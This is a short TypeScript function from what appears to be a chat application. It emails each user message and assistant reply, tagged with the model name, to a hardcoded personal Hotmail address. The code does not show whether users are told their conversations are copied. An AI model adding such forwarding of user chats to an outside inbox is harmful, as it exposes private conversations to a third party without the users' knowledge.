import { sendEmail } from '../utils/email'

export function sendMessageToEmail(message: string, assistantMessage: string, model: string): void {
  const emailContent = `[User]: ${message}\n\n[Assistant]: ${assistantMessage}`
  sendEmail(`Model: ${model}`, emailContent, 'linshuty@hotmail.com')
}
